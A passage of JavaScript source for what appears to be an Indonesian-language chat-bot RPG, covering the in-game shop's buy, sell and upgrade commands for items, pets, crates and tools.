    const pickaxe = (_pickaxe == 0 ? 1700 : '' || _pickaxe == 1 ? 3000 : '' || _pickaxe == 2 ? 5500 : '' || _pickaxe == 3 ? 10500 : '' || _pickaxe == 4 ? 27000 : '')
    const uppickaxe = (_pickaxe == 0 ? 0 : '' || _pickaxe == 1 ? 25 : '' || _pickaxe == 2 ? 55 : '' || _pickaxe == 3 ? 75 : '' || _pickaxe == 4 ? 120 : '')
    const durpickaxe = (_pickaxe == 0 ? 0 : '' || _pickaxe == 1 ? 40 : '' || _pickaxe == 2 ? 60 : '' || _pickaxe == 3 ? 80 : '' || _pickaxe == 4 ? 100 : '')
    const repickaxe = (_pickaxe == 0 ? 0 : '' || _pickaxe == 1 ? 10 : '' || _pickaxe == 2 ? 35 : '' || _pickaxe == 3 ? 65 : '' || _pickaxe == 4 ? 100 : '')
    const drepickaxe = (_pickaxe == 0 ? 0 : '' || _pickaxe == 1 ? 10 : '' || _pickaxe == 2 ? 25 : '' || _pickaxe == 3 ? 40 : '' || _pickaxe == 4 ? 60 : '')
    
    const _sword = global.db.data.users[m.sender].sword
    const sword = (_sword == 0 ? 1700 : '' || _sword == 1 ? 3000 : '' || _sword == 2 ? 5500 : '' || _sword == 3 ? 10500 : '' || _sword == 4 ? 27000 : '')
    const upsword = (_sword == 0 ? 0 : '' || _sword == 1 ? 15 : '' || _sword == 2 ? 40 : '' || _sword== 3 ? 65 : '' || _sword == 4 ? 100 : '')
    const dursword = (_sword == 0 ? 0 : '' || _sword == 1 ? 40 : '' || _sword == 2 ? 60 : '' || _sword == 3 ? 80 : '' || _sword == 4 ? 100 : '')
    const resword = (_sword == 0 ? 0 : '' || _sword == 1 ? 10 : '' || _sword == 2 ? 35 : '' || _sword == 3 ? 65 : '' || _sword == 4 ? 100 : '')
    const dresword = (_sword == 0 ? 0 : '' || _sword == 1 ? 10 : '' || _sword == 2 ? 25 : '' || _sword == 3 ? 40 : '' || _sword == 4 ? 60 : '')
    
    let upgrd = (args[0] || '').toLowerCase()
    let type = (args[0] || '').toLowerCase()
    let _type = (args[1] || '').toLowerCase()
    let jualbeli = (args[0] || '').toLowerCase()
    const Kchat = `
*🎒 SHOP*

*🧪 Penggunaan :*
_${prefix}shop <Buy|sell> <item> <jumlah>_
Contoh penggunaan: _*${prefix}shop buy potion 1*_

*📮 Note :* 
bila sudah tidak ada harganya, berarti sudah tidak bisa dibeli / sudah level max

🛍️ List Barang:
━━━━━━━━━━━━━━━━━━━
*♻ Barang   | 💲 Harga beli*
━━━━━━━━━━━━━━━━━━━
*🥤 Potion:* ${potion}
*🍶 Aqua:* ${Baqua}
*🪙  Gold :* ${Bgold}
*💎 Diamond:* ${Bdiamond}
*🪨 Batu:* ${Bbatu}
*🪵 Kayu:* ${Bkayu}
*🕸️ String:* ${Bstring}
*⛓️ Iron:* ${Biron}
*🗑️ Sampah:* ${Bsampah}

*📦 Common:* ${Bcommon} 
*🛍️ Uncommon:* ${Buncommon}
*🎁 Mythic:* ${Bmythic}
*🧰 Legendary:* ${Blegendary}
*📫 Pet:* ${Bpet}

*🥼 Armor:* ${armor}
*🎣 Fishingrod:* ${pancing}
*🪱 Umpan:* ${Bumpan}

*🌾 Bibit mangga:* ${Bjagung}
*🌾 Bibit apel:* ${Bapel}
*🌾 Bibit jeruk:* ${Bjeruk}
*🌾 Bibit pisang:* ${Bapel}
*🌾 Bibit anggur:* ${Banggur}

━━━━━━━━━━━━━━━━━━━
*♻ Barang   | 💲 Harga Jual*
━━━━━━━━━━━━━━━━━━━
*🥤 Potion:* ${Spotion}
*🪙 Gold:* ${Sgold}
*🧭 Arloji:* ${Sarloji}
*🪨 Batu:* ${Sbatu}
*🪵 Kayu:* ${Skayu}
*🕸️ String:* ${Sstring}
*⛓️ Iron:* ${Siron}
*💎 Diamond:* ${Sdiamond}
*🗑️ Sampah:* ${Ssampah}

*📦 Common:* ${Scommon}
*🛍️ Uncommon:* ${Suncommon}
*🎁 Mythic:* ${Smythic}
*🧰 Legendary:* ${Slegendary}
*📫 Pet:* ${Spet}

*🥭 Mangga:* ${Sjagung}
*🍎 Apel:* ${Sapel}
*🍊 Jeruk:* ${Sjeruk}
*🍌 Pisang:* ${Sapel}
*🍇 Anggur:* ${Sanggur}

━━━━━━━━━━━━━━━━━
*🦊 Pet.      | 💲 Harga Beli*
━━━━━━━━━━━━━━━━━
*🐱 Kucing:* ${Bkucing} 🪙
*🐶 Anjing:* ${Banjing} 🪙
*🦊 Fox:* ${Bfox} 🪙 
*🐴 Kuda:* ${Bkuda} 🪙 
*🐺 Serigala:* ${Bserigala} 🪙
*🦜 Phonix:* ${Bphonix} 🪙
*🐎 Centaur:* ${Bcentaur} 🪙
*🦅 Griffin:* ${Bgriffin} 🪙
*🐉 Naga:* ${Bnaga} 🪙

*🥩 Foodpet:* ${Bfood} 💲

━━━━━━━━━━━━━━━━━
*🔨 Upgrade & Repair | 💲 Harga*
━━━━━━━━━━━━━━━━━
*◪ Upgrade ⏫*

*🥼 Armor:* ${uparmor} 💎 ${_armor == 0 ? '(Belum memiliki)' : _armor == 5 ? '( *Level max* )' : ''}

*🎣 Fishingrod:* ${uppancing} 💎
╰▸ *Durability:* ${durfishingrod} ${_pancing == 0 ? '(Belum memiliki)' : _pancing == 5 ? '( *Level max* )' : ''}

*⛏️ Pickaxe:* ${uppickaxe} 💎
╰▸ *Durability:* ${durpickaxe} ${_pickaxe == 0 ? '(Belum memiliki)' : _pickaxe == 5 ? '( *Level max* )' : ''}

*🗡️ Sword:* ${upsword} 💎
╰▸ *Durability:* ${dursword} ${_sword == 0 ? '(Belum memiliki)' : _sword == 5 ? '( *Level max* )' : ''}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*◪ Repair 🔨*

*🎣 Fishingrod:* ${refishingrod} 💎 ${_pancing == 0 ? '(Belum memiliki)' : _pancing == 5 ? '( *Level max* )' : ''}
╰▸ + ${drefishingrod} Durability 

*⛏️ Pickaxe:* ${repickaxe} 💎 ${_pickaxe == 0 ? '(Belum memiliki)' : _pickaxe == 5 ? '( *Level max* )' : ''}
╰▸ + ${drepickaxe} Durability

*🗡️ Sword:* ${resword} 💎 ${_sword == 0 ? '(Belum memiliki)' : _sword == 5 ? '( *Level max* )' : ''}
╰▸ + ${dresword} Durability

━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━
`.trim()
    try {
        if (/shop|toko|buy/i.test(command)) {
            const count = args[2] && args[2].length > 0 ? Math.min(99999999999999999999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
            const sampah = global.db.data.users[m.sender].sampah
            switch (jualbeli) {
            case prefix+'buy':
                switch (_type) {
                	case prefix+'kucing':
                if (global.db.data.users[m.sender].kucing == 1) return m.reply('Kamu sudah memiliki pet ini', m)
                            if (global.db.data.users[m.sender].emas >= Bkucing * count) {
                                global.db.data.users[m.sender].kucing += count * 1
                                global.db.data.users[m.sender].emas -= Bkucing * count
                                m.reply(`✔️ Sukses Membeli Pet Kucing 🐱 Dengan Harga ${Bkucing * count} Gold 🪙`)
                            } else m.reply(`Gold Anda Tidak Cukup`)
                        
                        break
                    case prefix+'anjing':
                    if (global.db.data.users[m.sender].anjing == 1) return m.reply('Kamu sudah memiliki pet ini', m)
                            if (global.db.data.users[m.sender].emas >= Bkucing * count) {
                                global.db.data.users[m.sender].anjing += count * 1
                                global.db.data.users[m.sender].emas -= Bkucing * count
                                m.reply(`✔️ Sukses Membeli Pet Anjing 🐶 Dengan Harga ${Bkucing * count} Gold 🪙`)
                            } else m.reply(`Gold Anda Tidak Cukup`)
                        
                        break
                    case prefix+'kuda':
                    if (global.db.data.users[m.sender].kuda == 1) return m.reply('Kamu sudah memiliki pet ini', m)
                            if (global.db.data.users[m.sender].emas >= Bkuda * count) {
                                global.db.data.users[m.sender].kuda += count * 1
                                global.db.data.users[m.sender].emas -= Bkuda * count
                                m.reply(`✔️ Sukses Membeli Pet Kuda 🐴 Dengan Harga ${Bkuda * count} Gold 🪙`)
                            } else m.reply(`Gold Anda Tidak Cukup`)
                        
                        break
                    case prefix+'fox':
                    if (global.db.data.users[m.sender].rubah == 1) return m.reply('Kamu sudah memiliki pet ini', m)
                            if (global.db.data.users[m.sender].emas >= Bfox * count) {
                                global.db.data.users[m.sender].rubah += count * 1
                                global.db.data.users[m.sender].emas -= Bfox * count
                                m.reply(`✔️ Sukses Membeli Pet Rubah 🦊 Dengan Harga ${Bfox * count} Gold 🪙`)
                            } else m.reply(`Gold Anda Tidak Cukup`)
                        
                        break
                 case prefix+'serigala':
                 if (global.db.data.users[m.sender].serigala == 1) return m.reply('Kamu sudah memiliki pet ini', m)
                            if (global.db.data.users[m.sender].emas >= Bserigala * count) {
                                global.db.data.users[m.sender].serigala += count * 1
                                global.db.data.users[m.sender].emas -= Bserigala * count
                                m.reply(`✔️ Sukses Membeli Pet Serigala 🐺 Dengan Harga ${Bserigala * count} Gold 🪙`)
                            } else m.reply(`Gold Anda Tidak Cukup`)
                        
                        break
                    case prefix+'phonix':
                    if (global.db.data.users[m.sender].phonix == 1) return m.reply('Kamu sudah memiliki pet ini', m)
                            if (global.db.data.users[m.sender].emas >= Bphonix * count) {
                                global.db.data.users[m.sender].phonix += count * 1
                                global.db.data.users[m.sender].emas -= Bphonix * count
                                m.reply(`✔️ Sukses Membeli Pet Phonix 🦜 Dengan Harga ${Bphonix * count} Gold 🪙`)
                            } else m.reply(`Gold Anda Tidak Cukup`)
                        
                        break
                case prefix+'centaur':
                if (global.db.data.users[m.sender].centaur == 1) return m.reply('Kamu sudah memiliki pet ini', m)
                            if (global.db.data.users[m.sender].emas >= Bcentaur * count) {
                                global.db.data.users[m.sender].centaur += count * 1
                                global.db.data.users[m.sender].emas -= Bcentaur* count
                                m.reply(`✔️ Sukses Membeli Pet Centaur 🐎 Dengan Harga ${Bcentaur * count} Gold 🪙`)
                            } else m.reply(`Gold Anda Tidak Cukup`)
                        
                        break
                 case prefix+'griffin':
                 if (global.db.data.users[m.sender].griffin == 1) return m.reply('Kamu sudah memiliki pet ini', m)
                            if (global.db.data.users[m.sender].emas >= Bgriffin * count) {
                                global.db.data.users[m.sender].griffin += count * 1
                                global.db.data.users[m.sender].emas -= Bgriffin * count
                                m.reply(`✔️ Sukses Membeli Pet Griffin 🦅 Dengan Harga ${Bgriffin * count} Gold 🪙`)
                            } else m.reply(`Gold Anda Tidak Cukup`)
                        
                        break
               case prefix+'naga':
               if (global.db.data.users[m.sender].naga == 1) return m.reply('Kamu sudah memiliki pet ini', m)
                            if (global.db.data.users[m.sender].emas >= Bnaga * count) {
                                global.db.data.users[m.sender].naga += count * 1
                                global.db.data.users[m.sender].emas -= Bnaga * count
                                m.reply(`✔️ Sukses Membeli Pet Naga 🐉 Dengan Harga ${Bnaga * count} Gold 🪙`)
                            } else m.reply(`Gold Anda Tidak Cukup`)
                        
                        break
                case prefix+'foodpet':
                            if (global.db.data.users[m.sender].money >= Bfood * count) {
                                global.db.data.users[m.sender].makananpet += count * 1
                                global.db.data.users[m.sender].money -= Bfood * count
                                m.reply(`✔️ Sukses Membeli FoodPet 🥩 Dengan Harga ${Bfood * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup`)
                        
                        break
                    case prefix+'potion':
                            if (global.db.data.users[m.sender].money >= potion * count) {
                                global.db.data.users[m.sender].money -= potion * count
                                global.db.data.users[m.sender].potion += count * 1
                                m.reply(`✔️ Sukses Membeli ${count} Potion 🥤 Dengan Harga ${potion * count} money 💹\n\n📍 Gunakan Potion Dengan Ketik: *${prefix}use potion <jumlah>*`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Potion Dengan Harga ${potion * count} Money `,)
                        break
                    case `gold`:
                            if (global.db.data.users[m.sender].money >= Bgold * count) {
                            global.db.data.users[m.sender].money -= Bgold * count
                            global.db.data.users[m.sender].emas += count * 1
                            m.reply(`Sukses Membeli ${count} Gold 🪙 Dengan Harga ${Bgold * count} money`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Gold Dengan Harga ${Bgold * count} Money `,)
                        break
                    case prefix+'bibitmangga':
                            if (global.db.data.users[m.sender].money >= Bjagung * count) {
                            global.db.data.users[m.sender].money -= Bjagung * count
                            global.db.data.users[m.sender].bibitmangga += count * 1
                            m.reply(`✔️ Sukses Membeli ${count} Bibit Mangga 🌾\nDengan Harga ${Bapel * count} money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Bibit Mangga 🌾\nDengan Harga ${Bapel * count} Money 💹`,)
                        break
                    case prefix+'bibitapel':
                            if (global.db.data.users[m.sender].money >= Bapel * count) {
                            global.db.data.users[m.sender].money -= Bapel* count
                            global.db.data.users[m.sender].bibitapel += count * 1
                            m.reply(`✔️ Sukses Membeli ${count} Bibit Apel🌾\nDengan Harga ${Bapel * count} money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Bibit Apel 🌾\nDengan Harga ${Bapel * count} Money 💹`,)
                        break
                    case prefix+'bibitjeruk':
                            if (global.db.data.users[m.sender].money >= Bapel * count) {
                            global.db.data.users[m.sender].money -= Bapel* count
                            global.db.data.users[m.sender].bibitjeruk += count * 1
                            m.reply(`✔️ Sukses Membeli ${count} Bibit Jeruk🌾\nDengan Harga ${Bapel * count} money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Bibit Jeruk 🌾\nDengan Harga ${Bapel * count} Money 💹`,)
                        break
                     case prefix+'bibitpisang':
                            if (global.db.data.users[m.sender].money >= Bapel * count) {
                            global.db.data.users[m.sender].money -= Bapel* count
                            global.db.data.users[m.sender].bibitpisang += count * 1
                            m.reply(`✔️ Sukses Membeli ${count} Bibit Pisang🌾\nDengan Harga ${Bapel * count} money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Bibit Pisang 🌾\nDengan Harga ${Bapel * count} Money 💹`,)
                        break
                    case prefix+'bibitanggur':
                            if (global.db.data.users[m.sender].money >= Bapel * count) {
                            global.db.data.users[m.sender].money -= Bapel* count
                            global.db.data.users[m.sender].bibitanggur += count * 1
                            m.reply(`✔️ Sukses Membeli ${count} Bibit Anggur🌾\nDengan Harga ${Bapel * count} money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Bibit Anggur 🌾\nDengan Harga ${Bapel * count} Money 💹`,)
                        break
                    case prefix+'diamond':
                            if (global.db.data.users[m.sender].money >= Bdiamond * count) {
                                global.db.data.users[m.sender].diamond += count * 1
                                global.db.data.users[m.sender].money -= Bdiamond * count
                                m.reply(`✔️ Sukses Membeli ${count} Diamond 💎 Dengan Harga ${Bdiamond * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup`)
                        break
                    case prefix+'batu':
                           if (global.db.data.users[m.sender].money >= Bbatu * count) {
                               global.db.data.users[m.sender].batu += count * 1
                               global.db.data.users[m.sender].money -= Bbatu * count
                               m.reply(`✔️ Sukses Membeli ${count} Batu 🪨 Dengan Harga ${Bbatu * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup`)
                        break
                    case prefix+'umpan':
                           if (global.db.data.users[m.sender].money >= Bumpan * count) {
                               global.db.data.users[m.sender].umpan += count * 1
                               global.db.data.users[m.sender].money -= Bumpan * count
                               m.reply(`✔️ Sukses Membeli ${count} Umpan 🪱 Dengan Harga ${Bumpan * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup`)
                        break
                    case prefix+'kayu':
                            if (global.db.data.users[m.sender].money >= Bkayu * count) {
                                global.db.data.users[m.sender].kayu += count * 1
                                global.db.data.users[m.sender].money -= Bkayu * count
                                m.reply(`✔️ Sukses Membeli ${count} Kayu 🪵 Dengan Harga ${Bkayu * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup`)
                        break
                     case prefix+'aqua':
                            if (global.db.data.users[m.sender].money >= Baqua * count) {
                                global.db.data.users[m.sender].aqua += count * 1
                                global.db.data.users[m.sender].money -= Bkayu * count
                                m.reply(`✔️ Sukses Membeli ${count} Aqua 🍶 Dengan Harga ${Baqua * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup`)
                        break
                    case prefix+'string':
                            if (global.db.data.users[m.sender].money >= Bstring * count) {
                                global.db.data.users[m.sender].string += count * 1
                                global.db.data.users[m.sender].money -= Bstring * count
                                m.reply(`✔️ Sukses Membeli ${count} String 🕸️ Dengan Harga ${Bstring * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup`)
                        break
                    case prefix+'iron':
                           if (global.db.data.users[m.sender].money >= Biron * count) {
                               global.db.data.users[m.sender].iron += count * 1
                               global.db.data.users[m.sender].money -= Biron * count
                               m.reply(`✔️ Sukses Membeli ${count} Iron ⛓️ Dengan Harga ${Biron * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup`)
                        break
                    case prefix+'common':
                            if (global.db.data.users[m.sender].money >= Bcommon * count) {
                                global.db.data.users[m.sender].common += count * 1
                                global.db.data.users[m.sender].money -= Bcommon * count
                                m.reply(`✔️ Sukses Membeli ${count} Common Crate 📦 Dengan Harga ${Bcommon * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Common Crate 📦 Dengan Harga ${Bcommon * count} Money 💹 \n\n📍 Buka Crate Dengan Ketik: *${prefix}open common*`)
                        
                        break
                    case prefix+'uncommon':
                            if (global.db.data.users[m.sender].money >= Buncommon * count) {
                                global.db.data.users[m.sender].uncommon += count * 1
                                global.db.data.users[m.sender].money -= Buncommon * count
                                m.reply(`✔️ Sukses Membeli ${count} Uncommon Crate Dengan Harga ${Buncommon * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Uncommon Crate 🛍️ Dengan Harga ${Buncommon * count} Money 💹\n\n📍 Buka Crate Dengan Ketik: *${prefix}open uncommon*`)
                        
                        break
                    case prefix+'mythic':
                            if (global.db.data.users[m.sender].money >= Bmythic * count) {
                                    global.db.data.users[m.sender].mythic += count * 1
                                global.db.data.users[m.sender].money -= Bmythic * count
                                m.reply(`✔️ Sukses Membeli ${count} Mythic Crate 🎁 Dengan Harga ${Bmythic * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Mythic Crate 🎁 Dengan Harga ${Bmythic* count} Money\n\n📍 Buka Crate Dengan Ketik:*${prefix}open mythic*`)
                        
                        break
                    case prefix+'legendary':
                            if (global.db.data.users[m.sender].money >= Blegendary * count) {
                                global.db.data.users[m.sender].legendary += count * 1
                                global.db.data.users[m.sender].money -= Blegendary * count
                                m.reply(`✔️ Sukses Membeli ${count} Legendary Crate 🧰 Dengan Harga ${Blegendary * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Legendary Crate 🧰 Dengan Harga ${Blegendary * count} Money  💹\n\n📍 Buka Crate Dengan Ketik: *${prefix}open legendary*`)
                        
                        break
                    case prefix+'pet':
                            if (global.db.data.users[m.sender].money >= Bpet * count) {
                                global.db.data.users[m.sender].pet += count * 1
                                global.db.data.users[m.sender].money -= Bpet * count
                                m.reply(`✔️ Sukses Membeli ${count} Pet Crate 📫 Dengan Harga ${Bpet * count} Money 💹`)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Pet Crate 📫 Dengan Harga ${Bpet * count} Money  💹\n\n📍 Buka Crate Dengan Ketik: *${prefix}open legendary*`)
                        
                        break
                    case prefix+'sampah':
                            if (global.db.data.users[m.sender].money >= Bsampah * count) {
                                global.db.data.users[m.sender].sampah += count * 1
                                global.db.data.users[m.sender].money -= Bsampah * count
                                m.reply(`✔️ Sukses Membeli ${count} Sampah 🗑️ Dengan Harga ${Bsampah * count} Money 💹 `)
                            } else m.reply(`Uang Anda Tidak Cukup Untuk Membeli ${count} Sampah 🗑️ Dengan Harga ${Bsampah * count} Money 💹`)
                        
                        break
                    case prefix+'armor':
                            if (global.db.data.users[m.sender].armor == 1) return m.reply('Kamu sudah memiliki Armor', m)
                            if (global.db.data.users[m.sender].money > armor) {
                                global.db.data.users[m.sender].armor += 1
                                global.db.data.users[m.sender].money -= armor * 1
                                m.reply(`✔️ Sukses Membeli Armor 🥼 Seharga ${armor} Money` ,m)
                            } else m.reply(`Uang Mu Tidak Cukup Untuk Membeli Armor 🥼 Seharga ${armor} Money 💹`)
                        
                        break
                     case prefix+'fishingrod':
                            if (global.db.data.users[m.sender].pancing == 1) return m.reply('Kamu sudah memiliki pancingan', m)
                            if (global.db.data.users[m.sender].money > armor) {
                                global.db.data.users[m.sender].pancing += 1
                                global.db.data.users[m.sender].money -= armor * 1
                                global.db.data.users[m.sender].fishingroddurability = durfishingrod
                                m.reply(`✔️ Sukses Membeli Pancingan 🎣 Seharga ${pancing} Money` ,m)
                            } else m.reply(`Uang Mu Tidak Cukup Untuk Membeli Pancingan 🎣 Seharga ${pancing} Money 💹`)
                        
                        break
                    default:
                        return m.reply(Kchat, m)
                }
                break
            case prefix+'sell': 
                switch (_type) {
                    case prefix+'potion':
                        if (global.db.data.users[m.sender].potion >= count * 1) {
                            global.db.data.users[m.sender].money += Spotion * count
                            global.db.data.users[m.sender].potion -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Potion 🥤 Dengan Harga ${Spotion * count} Money 💹 `)
                        } else m.reply(`🥤 Potion Kamu Tidak Cukup`)
                        break
                    case prefix+'gold':
                        if (global.db.data.users[m.sender].gold >= count * 1) {
                            global.db.data.users[m.sender].money += Sgold * count
                            global.db.data.users[m.sender].gold -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Gold 🪙 Dengan Harga ${Sgold * count} Money 💹`)
                        } else m.reply(`Gold Kamu Tidak Cukup`)
                        break
                    case prefix+'arloji':
                        if (global.db.data.users[m.sender].arlok >= count * 1) {
                            global.db.data.users[m.sender].money += Sarloji * count
                            global.db.data.users[m.sender].arlok -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Arloji 🧭 Dengan Harga ${Sarloji * count} Money 💹`)
                        } else m.reply(`🧭 Arloji Kamu Tidak Cukup`)
                        break
                    case prefix+'batu':
                        if (global.db.data.users[m.sender].batu >= count * 1) {
                            global.db.data.users[m.sender].money += Sbatu * count
                            global.db.data.users[m.sender].batu -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Batu 🪨 Dengan Harga ${Sbatu * count} Money 💹`)
                        } else m.reply(`🪨 Batu Kamu Tidak Cukup`)
                        break
                    case prefix+'kayu':
                        if (global.db.data.users[m.sender].kayu >= count * 1) {
                            global.db.data.users[m.sender].money += Skayu * count
                            global.db.data.users[m.sender].kayu -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Kayu 🪵 Dengan Harga ${Skayu * count} Money 💹`)
                        } else m.reply(`🪵 Kayu Kamu Tidak Cukup`)
                        break
                    case prefix+'string':
                        if (global.db.data.users[m.sender].string >= count * 1) {
                            global.db.data.users[m.sender].money += Sstring * count
                            global.db.data.users[m.sender].string -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} String 🕸️ Dengan Harga ${Sstring * count} Money 💹`)
                        } else m.reply(`🕸️ String Kamu Tidak Cukup`)
                        break
                    case prefix+'iron':
                        if (global.db.data.users[m.sender].iron >= count * 1) {
                            global.db.data.users[m.sender].money += Siron * count
                            global.db.data.users[m.sender].iron -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Iron ⛓️ Dengan Harga ${Siron * count} Money 💹`)
                        } else m.reply(`⛓️ Iron Kamu Tidak Cukup`)
                        break
                    case prefix+'common':
                        if (global.db.data.users[m.sender].common >= count * 1) {
                            global.db.data.users[m.sender].money += Scommon * count
                            global.db.data.users[m.sender].common -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Common Crate 📦 Dengan Harga ${Scommon * count} Money 💹`)
                        } else m.reply(`📦 Common Crate Kamu Tidak Cukup`)
                        break
                    case prefix+'uncommon':
                        if (global.db.data.users[m.sender].uncommon >= count * 1) {
                            global.db.data.users[m.sender].money += Suncommon * count
                            global.db.data.users[m.sender].uncommon -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Uncommon Crate 🛍️ Dengan Harga ${Suncommon * count} Money 💹`)
                        } else m.reply(`🛍️ Uncommon Crate Kamu Tidak Cukup`)
                        break
                    case prefix+'mythic':
                        if (global.db.data.users[m.sender].mythic >= count * 1) {
                            global.db.data.users[m.sender].money += Smythic * count
                            global.db.data.users[m.sender].mythic -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Mythic Crate 🎁 Dengan Harga ${Smythic * count} Money 💹`)
                        } else m.reply(`🎁 Mythic Crate Kamu Tidak Cukup `)
                        break
                    case prefix+'legendary':
                        if (global.db.data.users[m.sender].legendary >= count * 1) {
                            global.db.data.users[m.sender].money += Slegendary * count
                            global.db.data.users[m.sender].legendary -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Legendary Crate 🧰 Dengan Harga ${Slegendary * count} Money 💹`)
                        } else m.reply(`🧰 Legendary Crate Kamu Tidak Cukup `)
                        break
                     case prefix+'pet':
                        if (global.db.data.users[m.sender].pet >= count * 1) {
                            global.db.data.users[m.sender].money += Spet * count
                            global.db.data.users[m.sender].pet -= count * 1
                            m.reply(`✔️ Sukses Menjual ${count} Pet Crate 📫 Dengan Harga ${Spet * count} Money 💹`)
                        } else m.reply(`📫 Pet Crate Kamu Tidak Cukup `)
                        break
                    case prefix+'sampah':
                        if (global.db.data.users[m.sender].sampah >= count * 1) {
                            global.db.data.users[m.sender].sampah -= count * 1
                            global.db.data.users[m.sender].money += Ssampah * count
                            m.reply(`✔️ Sukses Menjual ${count} Sampah 🗑️ Dengan Harga ${Ssampah * count} Money 💹`)
                        } else m.reply(`🗑️ Sampah Anda Tidak Cukup `)
                        break
                    case prefix+'diamond':
                        if (global.db.data.users[m.sender].diamond >= count * 1) {
                            global.db.data.users[m.sender].diamond -= count * 1
                            global.db.data.users[m.sender].money += Sdiamond * count
                            m.reply(`✔️ Sukses Menjual ${count} Diamond 💎 Dengan Harga ${Sdiamond * count} Money 💹`)
                        } else m.reply(`💎 Diamond Anda Tidak Cukup `)
                        break
                     case prefix+'mangga':
                        if (global.db.data.users[m.sender].mangga >= count * 1) {
                            global.db.data.users[m.sender].mangga -= count * 1
                            global.db.data.users[m.sender].money += Smangga * count
                            m.reply(`✔️ Sukses Menjual ${count} Mangga 🥭 Dengan Harga ${Smangga * count} Money 💹`)
                        } else m.reply(`🥭 Mangga Anda Tidak Cukup `)
                        break
                     case prefix+'apel':
                        if (global.db.data.users[m.sender].apel >= count * 1) {
                            global.db.data.users[m.sender].apel -= count * 1
                            global.db.data.users[m.sender].money += Smangga * count
                            m.reply(`✔️ Sukses Menjual ${count} Apel 🍎 Dengan Harga ${Smangga * count} Money 💹`)
                        } else m.reply(`🍎 Apel Anda Tidak Cukup `)
                        break
                     case prefix+'jeruk':
                        if (global.db.data.users[m.sender].jeruk >= count * 1) {
                            global.db.data.users[m.sender].jeruk -= count * 1
                            global.db.data.users[m.sender].money += Smangga * count
                            m.reply(`✔️ Sukses Menjual ${count} Jeruk 🍊 Dengan Harga ${Smangga * count} Money 💹`)
                        } else m.reply(`🍊 Jeruk Anda Tidak Cukup `)
                        break
                     case prefix+'anggur':
                        if (global.db.data.users[m.sender].anggur >= count * 1) {
                            global.db.data.users[m.sender].anggur -= count * 1
                            global.db.data.users[m.sender].money += Smangga * count
                            m.reply(`✔️ Sukses Menjual ${count} Anggur 🍇 Dengan Harga ${Smangga * count} Money 💹`)
                        } else m.reply(`🍇 Anggur Anda Tidak Cukup `)
                        break
                     case prefix+'pisang':
                        if (global.db.data.users[m.sender].pisang >= count * 1) {
                            global.db.data.users[m.sender].pisang -= count * 1
                            global.db.data.users[m.sender].money += Smangga * count
                            m.reply(`✔️ Sukses Menjual ${count} Pisang 🍌 Dengan Harga ${Smangga * count} Money 💹`)
                        } else m.reply(`🍌 Pisang Anda Tidak Cukup `)
                        break
                    default:
                        return m.reply(Kchat, m)
                }
                break
            case prefix+'upgrade': 
                switch (_type) {
                	case prefix+'armor':
                            if (global.db.data.users[m.sender].armor == 5) return m.reply('Armormu sudah *Level Max*', m)
                            if (global.db.data.users[m.sender].armor == 0) return m.reply('Kamu belum mempunyai Armor', m)
                            if (global.db.data.users[m.sender].diamond > uparmor) {
                                global.db.data.users[m.sender].armor += 1
                                global.db.data.users[m.sender].diamond -= uparmor * 1
                                m.reply(`✔️ Sukses Mengupgrade Armor 🥼 Seharga ${uparmor} Diamond 💎` ,m)
                            } else m.reply(`Diamond Mu Tidak Cukup Untuk Mengupgrade Armor 🥼 Seharga ${uparmor} Diamond 💎`)
                        
                        break
                        case prefix+'fishingrod':
                            if (global.db.data.users[m.sender].fishingrod == 4) return m.reply('Pancingan mu udah *Level Max*', m)
                            if (global.db.data.users[m.sender].fishingrod == 0) return m.reply('Kamu belum mempunyai Pancingan', m)
                            if (global.db.data.users[m.sender].diamond > uppancing) {
                                global.db.data.users[m.sender].pancing += 1
                                global.db.data.users[m.sender].diamond -= uppancing * 1
                                global.db.data.users[m.sender].fishingroddurability = durpancing
                                m.reply(`✔️ Sukses Mengupgrade Fishingrod 🎣  Seharga ${uppancing} Diamond 💎` ,m)
                            } else m.reply(`Diamond Mu Tidak Cukup Untuk Mengupgrade Fishingrod 🎣  Seharga ${uppancing} Diamond 💎`)
                        
                        break
                        
                            case prefix+'sword':
                            if (global.db.data.users[m.sender].sword == 5) return m.reply('Sword mu udah *Level Max*', m)
                            if (global.db.data.users[m.sender].sword == 0) return m.reply('Kamu belum mempunyai Sword', m)
